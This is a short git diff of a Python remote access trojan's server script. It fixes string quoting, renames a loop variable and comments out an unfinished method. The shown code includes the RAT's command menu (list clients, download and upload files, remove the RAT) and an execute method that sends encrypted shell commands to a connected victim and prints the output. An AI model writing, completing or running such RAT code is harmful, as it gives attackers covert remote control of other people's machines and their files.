@@ -16,7 +16,7 @@ from Crypto.Hash import SHA256
 #Variables
 port = 80                    #Connection Port
 key = ""                     #Encryption key (16 characters) use the same on server script
-banner = ```
+banner = '''
  _______   __      __
 |   _   |  \ \    / /
 |  |_|  |   \ \  / / 
@@ -24,8 +24,8 @@ banner = ```
 |  |          \  /   
 |  |           ||    
 |__|           ||    
-```
-commands = ```
+'''
+commands = '''
 Available commands:
 help                                    - Show this help
 clients                                 - List connected clients
@@ -35,7 +35,7 @@ download <Path_file> <Path_to_past>     - Download a file from client
 upload <Path_file> <Path_to_past>       - Upload a file to client
 (don't forget .extension in path)
 remove                                  - Remove the RAT from client
-```
+'''
 
 
 
@@ -76,24 +76,24 @@ class Server(threading.Thread):
             return None
 
 
-class Client(threading.Thread):
+class Client():
     def __init__(self, connection, address, id, os):
         self.connection = connection
         self.address = address
         self.id = id
         self.os = os
-    def run():
-        #vérification régulière si le client est tjrs connecté
+#    def run():
+#        #vérification régulière si le client est tjrs connecté
     def execute(self):
         self.connection.send(encrypt(key, "execute"))
-        Continue = True
+        ctn = True
         print("Use 'Exit' command to close terminal")
-        while Continue:
+        while ctn:
             cmd = input("...")
             self.connection.send(encrypt(key, cmd))
             out = decrypt(key, self.connection.recv(4096))
             if out == "exit":
-                Continue = False
+                ctn = False
                 print("Terminal closed")
             print(out)
             
